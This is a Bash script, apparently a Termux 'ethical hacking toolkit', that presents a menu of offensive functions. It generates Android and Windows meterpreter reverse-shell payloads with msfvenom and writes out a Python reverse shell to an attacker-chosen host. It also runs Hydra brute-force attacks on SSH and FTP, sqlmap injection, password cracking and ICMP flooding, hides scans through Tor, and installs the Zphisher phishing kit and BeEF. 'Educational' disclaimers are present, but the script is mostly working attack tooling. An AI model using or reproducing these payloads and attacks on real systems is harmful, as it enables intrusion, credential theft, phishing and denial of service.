#!/data/data/com.termux/files/usr/bin/bash

# ==============================================
#  Termux Ethical Hacking Toolkit v3.0
#  All-in-One (OSINT, Payload, Wi-Fi, Cracking, etc.)
#  For Educational Purposes ONLY
# ==============================================

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
WHITE='\033[1;37m'
RESET='\033[0m'

REPORT_DIR="/sdcard/hack_reports"
mkdir -p "$REPORT_DIR"

trap ctrl_c INT
ctrl_c() {
    echo -e "\n${RED}[!] Exiting...${RESET}"
    exit 1
}

show_banner() {
    clear
    echo -e "${CYAN}__  __     _    _    _ _   ___${RESET}"
    echo -e "${GREEN}|  \\/  |___| |_ (_)__| (_) | _ )_ _ ___${RESET}"
    echo -e "${YELLOW}| |\\/| / -_) ' \\| / _\` | | | _ \\ '_/ _ \\\\${RESET}"
    echo -e "${RED}|_|  |_\\___|_||_|_\\__,_|_| |___/_| \\___/${RESET}"
    echo -e "${MAGENTA}        Termux Ethical Hacking Toolkit v3.0${RESET}"
    echo -e "${RED}        Use only on systems you OWN or have PERMISSION for${RESET}"
    echo -e "${WHITE}==================================================${RESET}"
}

check_deps() {
    echo -e "${YELLOW}[*] Checking & installing dependencies...${RESET}"
    pkg update -y
    
    PKGS=("nmap" "curl" "wget" "git" "python" "openssh" "hydra" "whois" "dnsutils" "tor" "proxychains-ng" "gobuster" "sqlmap" "nikto" "unzip" "arp-scan" "john" "ffuf" "subfinder" "httpx" "whatweb")
    MISSING=()
    
    for pkg in "${PKGS[@]}"; do
        if ! command -v $pkg &> /dev/null; then
            if [[ "$pkg" == "dnsutils" ]]; then
                if ! command -v dig &> /dev/null; then
                    MISSING+=($pkg)
                fi
            elif [[ "$pkg" == "proxychains-ng" ]]; then
                if ! command -v proxychains &> /dev/null; then
                    MISSING+=($pkg)
                fi
            else
                MISSING+=($pkg)
            fi
        fi
    done
    
    if [ ${#MISSING[@]} -ne 0 ]; then
        echo -e "${YELLOW}[!] Missing packages: ${MISSING[*]}${RESET}"
        read -p "Install missing packages? (y/N): " choice
        if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
            for pkg in "${MISSING[@]}"; do
                case $pkg in
                    "proxychains-ng") pkg install proxychains-ng -y ;;
                    "dnsutils") pkg install dnsutils -y ;;
                    *) pkg install $pkg -y ;;
                esac
            done
            # Python packages (OSINT)
            pip install --user theharvester sherlock holehe
            echo -e "${GREEN}[+] Dependencies installed!${RESET}"
        else
            echo -e "${RED}[!] Some tools may not work.${RESET}"
        fi
    else
        echo -e "${GREEN}[+] All dependencies are already installed.${RESET}"
    fi
    sleep 1
}

# Utility: Save report
save_report() {
    local content="$1"
    local filename="$2"
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local filepath="$REPORT_DIR/${filename}_${timestamp}.txt"
    echo "$content" > "$filepath"
    echo -e "${GREEN}[+] Report saved: $filepath${RESET}"
}

# ======================== NEW FEATURES ========================

# 7. OSINT (Sherlock + Holehe)
osint_menu() {
    clear
    echo -e "${BLUE}[+] OSINT (Open Source Intelligence)${RESET}"
    echo -e "${CYAN}1. Sherlock (Username search across 300+ sites)${RESET}"
    echo -e "${CYAN}2. Holehe (Check email registrations)${RESET}"
    echo -e "${CYAN}3. TheHarvester (Email/Subdomain harvest)${RESET}"
    read -p "Choose (1-3): " os_choice
    case $os_choice in
        1)
            read -p "Enter username: " username
            sherlock "$username"
            ;;
        2)
            read -p "Enter email: " email
            holehe "$email"
            ;;
        3)
            read -p "Enter domain: " domain
            theharvester -d "$domain" -b all
            ;;
        *) echo "Invalid" ;;
    esac
    read -p "Press Enter to continue..."
}

# 8. Payload Generator (MSFVenom or Python)
payload_gen() {
    clear
    echo -e "${BLUE}[+] Payload Generator${RESET}"
    echo -e "${CYAN}1. Android APK payload (msfvenom)${RESET}"
    echo -e "${CYAN}2. Windows EXE payload (msfvenom)${RESET}"
    echo -e "${CYAN}3. Python reverse shell (simple)${RESET}"
    read -p "Choose (1-3): " pay_choice
    case $pay_choice in
        1)
            if command -v msfvenom &> /dev/null; then
                read -p "LHOST (your IP): " lhost
                read -p "LPORT: " lport
                msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/payload.apk
                echo -e "${GREEN}[+] APK saved to /sdcard/payload.apk${RESET}"
            else
                echo -e "${RED}msfvenom not found. Install Metasploit: pkg install metasploit${RESET}"
            fi
            ;;
        2)
            if command -v msfvenom &> /dev/null; then
                read -p "LHOST: " lhost
                read -p "LPORT: " lport
                msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o /sdcard/payload.exe
                echo -e "${GREEN}[+] EXE saved to /sdcard/payload.exe${RESET}"
            else
                echo -e "${RED}msfvenom not found.${RESET}"
            fi
            ;;
        3)
            read -p "LHOST: " lhost
            read -p "LPORT: " lport
            cat > /sdcard/shell.py <<EOF
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$lhost",$lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
EOF
            echo -e "${GREEN}[+] Python shell saved to /sdcard/shell.py${RESET}"
            ;;
        *) echo "Invalid" ;;
    esac
    read -p "Press Enter to continue..."
}

# 9. Wi-Fi & LAN Scanner
wifi_lan() {
    clear
    echo -e "${BLUE}[+] Wi-Fi & LAN Tools${RESET}"
    echo -e "${CYAN}1. ARP Scan (all devices in LAN)${RESET}"
    echo -e "${CYAN}2. Wi-Fi Scan (termux-api, needs permission)${RESET}"
    echo -e "${CYAN}3. Wifite (automated Wi-Fi test, root)${RESET}"
    read -p "Choose (1-3): " wl_choice
    case $wl_choice in
        1)
            read -p "Network range (e.g., 192.168.1.0/24): " range
            arp-scan "$range" | tee "$REPORT_DIR/arp_scan.txt"
            ;;
        2)
            if command -v termux-wifi-scaninfo &> /dev/null; then
                termux-wifi-scaninfo
            else
                echo -e "${RED}termux-api not installed. Run: pkg install termux-api${RESET}"
            fi
            ;;
        3)
            if [ "$(id -u)" -ne 0 ]; then
                echo -e "${RED}Wifite needs root. Use 'tsu' and run again.${RESET}"
            else
                wifite
            fi
            ;;
        *) echo "Invalid" ;;
    esac
    read -p "Press Enter to continue..."
}

# 10. Password Cracking (John the Ripper)
crack_pass() {
    clear
    echo -e "${BLUE}[+] Password Cracking (John the Ripper)${RESET}"
    read -p "Path to hash file (e.g., /sdcard/hash.txt): " hashfile
    if [ ! -f "$hashfile" ]; then
        echo -e "${RED}File not found!${RESET}"
        read -p "Press Enter to continue..."
        return
    fi
    echo -e "${CYAN}1. Crack MD5 hash${RESET}"
    echo -e "${CYAN}2. Crack SHA1 hash${RESET}"
    echo -e "${CYAN}3. Auto-detect & crack${RESET}"
    read -p "Choose (1-3): " crack_choice
    case $crack_choice in
        1) john --format=raw-md5 --wordlist=/sdcard/rockyou.txt "$hashfile" ;;
        2) john --format=raw-sha1 --wordlist=/sdcard/rockyou.txt "$hashfile" ;;
        3) john --wordlist=/sdcard/rockyou.txt "$hashfile" ;;
        *) echo "Invalid" ;;
    esac
    john --show "$hashfile"
    read -p "Press Enter to continue..."
}

# 11. Subdomain & Fuzzing
subdomain_fuzz() {
    clear
    echo -e "${BLUE}[+] Subdomain & Fuzzing Tools${RESET}"
    echo -e "${CYAN}1. Subfinder (subdomain discovery)${RESET}"
    echo -e "${CYAN}2. FFUF (directory fuzzing)${RESET}"
    echo -e "${CYAN}3. HTTPX (check live subdomains)${RESET}"
    read -p "Choose (1-3): " sf_choice
    case $sf_choice in
        1)
            read -p "Domain: " domain
            subfinder -d "$domain" -o "$REPORT_DIR/subdomains.txt"
            cat "$REPORT_DIR/subdomains.txt"
            ;;
        2)
            read -p "URL (e.g., http://example.com/FUZZ): " url
            read -p "Wordlist path (default: /sdcard/rockyou.txt): " wordlist
            [ -z "$wordlist" ] && wordlist="/sdcard/rockyou.txt"
            ffuf -u "$url" -w "$wordlist"
            ;;
        3)
            read -p "File with subdomains (e.g., subdomains.txt): " subfile
            if [ -f "$subfile" ]; then
                httpx -l "$subfile" -o "$REPORT_DIR/live.txt"
                cat "$REPORT_DIR/live.txt"
            else
                echo -e "${RED}File not found!${RESET}"
            fi
            ;;
        *) echo "Invalid" ;;
    esac
    read -p "Press Enter to continue..."
}

# 12. Custom Command Runner
custom_cmd() {
    clear
    echo -e "${BLUE}[+] Custom Command Runner${RESET}"
    echo -e "${YELLOW}Type any command (e.g., ping google.com, traceroute 8.8.8.8)${RESET}"
    read -p ">> " cmd
    if [ -n "$cmd" ]; then
        eval "$cmd" | tee "$REPORT_DIR/custom_cmd.txt"
    else
        echo -e "${RED}No command entered.${RESET}"
    fi
    read -p "Press Enter to continue..."
}

# ======================== OLD FUNCTIONS (kept as before) ========================

info_gathering() {
    clear
    echo -e "${BLUE}[+] Information Gathering${RESET}"
    read -p "Enter Domain/IP: " target
    echo -e "${YELLOW}1. Whois Lookup${RESET}"
    whois $target | tee "$REPORT_DIR/whois.txt"
    echo -e "${YELLOW}2. DNS Info (dig)${RESET}"
    dig $target ANY | tee "$REPORT_DIR/dig.txt"
    echo -e "${YELLOW}3. IP Geolocation${RESET}"
    curl -s http://ipinfo.io/$target | python -m json.tool 2>/dev/null | tee "$REPORT_DIR/geo.txt"
    echo -e "${YELLOW}4. Subdomain Finder (crtsh)${RESET}"
    curl -s "https://crt.sh/?q=$target&output=json" | python -c "import sys, json; [print(entry['name_value']) for entry in json.load(sys.stdin)]" 2>/dev/null | sort -u | tee "$REPORT_DIR/subdomains_crt.txt"
    read -p "Press Enter to continue..."
}

network_scan() {
    clear
    echo -e "${BLUE}[+] Network Scanner${RESET}"
    read -p "Enter Target IP/Range (e.g., 192.168.1.1 or 192.168.1.0/24): " target
    echo -e "${YELLOW}1. Ping Sweep (Alive hosts)${RESET}"
    nmap -sn $target | tee "$REPORT_DIR/pingsweep.txt"
    echo -e "${YELLOW}2. Quick Port Scan (Top 1000)${RESET}"
    nmap -T4 -F $target | tee "$REPORT_DIR/quickport.txt"
    echo -e "${YELLOW}3. Full Port Scan (1-65535)${RESET}"
    nmap -p- -T4 $target | tee "$REPORT_DIR/fullport.txt"
    echo -e "${YELLOW}4. OS & Service Detection${RESET}"
    nmap -sV -O $target | tee "$REPORT_DIR/osservice.txt"
    read -p "Press Enter to continue..."
}

bruteforce() {
    clear
    echo -e "${BLUE}[+] Brute Force Menu${RESET}"
    echo -e "${CYAN}1. SSH Brute (Hydra)${RESET}"
    echo -e "${CYAN}2. FTP Brute (Hydra)${RESET}"
    read -p "Choose (1-2): " bf_choice
    read -p "Target IP: " bf_ip
    read -p "Username: " bf_user
    read -p "Path to Password List (e.g., /sdcard/pass.txt): " bf_pass
    if [ ! -f "$bf_pass" ]; then
        echo -e "${YELLOW}Password file not found! Downloading rockyou.txt to /sdcard/...${RESET}"
        wget -O /sdcard/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
        bf_pass="/sdcard/rockyou.txt"
    fi
    case $bf_choice in
        1) hydra -l $bf_user -P $bf_pass ssh://$bf_ip | tee "$REPORT_DIR/ssh_brute.txt" ;;
        2) hydra -l $bf_user -P $bf_pass ftp://$bf_ip | tee "$REPORT_DIR/ftp_brute.txt" ;;
        *) echo "Invalid" ;;
    esac
    read -p "Press Enter to continue..."
}

web_tools() {
    clear
    echo -e "${BLUE}[+] Web Application Testing${RESET}"
    echo -e "${CYAN}1. Directory Bruteforce (Gobuster)${RESET}"
    echo -e "${CYAN}2. SQL Injection (sqlmap)${RESET}"
    echo -e "${CYAN}3. Vulnerability Scan (Nikto)${RESET}"
    echo -e "${CYAN}4. WhatWeb (Technology detection)${RESET}"
    read -p "Choose (1-4): " web_choice
    case $web_choice in
        1)
            read -p "Target URL (e.g., http://example.com): " url
            gobuster dir -u $url -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 | tee "$REPORT_DIR/gobuster.txt"
            ;;
        2)
            read -p "Target URL (with param): " sql_url
            sqlmap -u "$sql_url" --batch --random-agent | tee "$REPORT_DIR/sqlmap.txt"
            ;;
        3)
            read -p "Target URL: " nikto_url
            nikto -h $nikto_url | tee "$REPORT_DIR/nikto.txt"
            ;;
        4)
            read -p "Target URL: " wb_url
            whatweb "$wb_url" | tee "$REPORT_DIR/whatweb.txt"
            ;;
        *) echo "Invalid" ;;
    esac
    read -p "Press Enter to continue..."
}

anonymity() {
    clear
    echo -e "${BLUE}[+] Anonymity Tools${RESET}"
    echo -e "${CYAN}1. Start Tor & Check IP${RESET}"
    echo -e "${CYAN}2. Use Proxychains with Nmap (Hide Scan)${RESET}"
    read -p "Choose (1-2): " anon_choice
    case $anon_choice in
        1)
            tor &
            sleep 3
            curl --socks5-hostname 127.0.0.1:9050 http://check.torproject.org/api/ip
            ;;
        2)
            echo -e "${RED}[!] Make sure Tor is running (Option 1 first)${RESET}"
            read -p "Target IP: " scan_t
            proxychains nmap -sT -Pn -p 80,443 $scan_t
            ;;
        *) echo "Invalid" ;;
    esac
    read -p "Press Enter to continue..."
}

stress_test() {
    clear
    echo -e "${RED}⚠️  WARNING: This is for EDUCATIONAL testing on YOUR own servers ONLY! ⚠️${RESET}"
    echo -e "${CYAN}1. HTTP Flood (Slowloris Style - Python)${RESET}"
    echo -e "${CYAN}2. ICMP Flood (hping3 - Needs root/raw socket)${RESET}"
    read -p "Choose (1-2): " dos_choice
    read -p "Target IP: " dos_ip
    read -p "Target Port (80/443): " dos_port
    case $dos_choice in
        1)
            echo -e "${YELLOW}[!] Using Python socket flood...${RESET}"
            python -c "import socket, threading, sys; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('$dos_ip',$dos_port)); s.send(b'GET / HTTP/1.1\r\n\r\n'); [sys.stdout.write('.') for _ in range(1000)]"
            ;;
        2)
            if [ "$(id -u)" -ne 0 ]; then
                echo -e "${RED}Need root for hping3 ICMP flood. Try 'tsu' in Termux.${RESET}"
            else
                hping3 -S --flood -p $dos_port $dos_ip
            fi
            ;;
        *) echo "Invalid" ;;
    esac
    read -p "Press Enter to continue..."
}

install_extra() {
    clear
    echo -e "${BLUE}[+] Installing Extra Tools (Zphisher, XSStrike, etc.)${RESET}"
    cd ~
    git clone https://github.com/htr-tech/zphisher.git
    git clone https://github.com/s0md3v/XSStrike.git
    cd XSStrike && pip install --user -r requirements.txt
    cd ~
    git clone https://github.com/beefproject/beef.git
    echo -e "${GREEN}[+] Extra tools installed in ~/ directory.${RESET}"
    read -p "Press Enter to continue..."
}

# ======================== MAIN MENU ========================

main_menu() {
    show_banner
    echo -e "${WHITE}┌──[${GREEN}Main Menu${WHITE}]───────────────────────────────┐${RESET}"
    echo -e "${CYAN}│  ${WHITE}1. ${GREEN}Information Gathering${RESET}               │"
    echo -e "${CYAN}│  ${WHITE}2. ${BLUE}Network Scanner (Nmap)${RESET}              │"
    echo -e "${CYAN}│  ${WHITE}3. ${MAGENTA}Brute Force (SSH/FTP)${RESET}              │"
    echo -e "${CYAN}│  ${WHITE}4. ${YELLOW}Web Tools (SQL, Dir, Nikto, WhatWeb)${RESET}│"
    echo -e "${CYAN}│  ${WHITE}5. ${CYAN}Anonymity (Tor/Proxy)${RESET}               │"
    echo -e "${CYAN}│  ${WHITE}6. ${RED}Stress Test (Educational)${RESET}           │"
    echo -e "${CYAN}│  ${WHITE}7. ${MAGENTA}OSINT (Sherlock, Holehe)${RESET}         │"
    echo -e "${CYAN}│  ${WHITE}8. ${RED}Payload Generator (MSFVenom/Python)${RESET}  │"
    echo -e "${CYAN}│  ${WHITE}9. ${BLUE}Wi-Fi & LAN (ARP, Wifite)${RESET}          │"
    echo -e "${CYAN}│  ${WHITE}10.${YELLOW}Password Cracking (John)${RESET}          │"
    echo -e "${CYAN}│  ${WHITE}11.${GREEN}Subdomain & Fuzzing (FFUF, Subfinder)${RESET}│"
    echo -e "${CYAN}│  ${WHITE}12.${CYAN}Custom Command Runner${RESET}               │"
    echo -e "${CYAN}│  ${WHITE}13.${GREEN}Install Extra Tools${RESET}                │"
    echo -e "${CYAN}│  ${WHITE}14.${YELLOW}Update System${RESET}                     │"
    echo -e "${CYAN}│  ${WHITE}0. ${RED}Exit${RESET}                                │"
    echo -e "${WHITE}└─────────────────────────────────────────────────┘${RESET}"
    echo -n "Select option: "
    read main_opt

    case $main_opt in
        1) info_gathering ;;
        2) network_scan ;;
        3) bruteforce ;;
        4) web_tools ;;
        5) anonymity ;;
        6) stress_test ;;
        7) osint_menu ;;
        8) payload_gen ;;
        9) wifi_lan ;;
        10) crack_pass ;;
        11) subdomain_fuzz ;;
        12) custom_cmd ;;
        13) install_extra ;;
        14) pkg update && pkg upgrade -y ;;
        0) echo -e "${GREEN}Goodbye! Stay Ethical.${RESET}"; exit 0 ;;
        *) echo -e "${RED}Invalid Option!${RESET}"; sleep 1; main_menu ;;
    esac
    main_menu
}

# ======================== START ========================
check_deps
main_menu
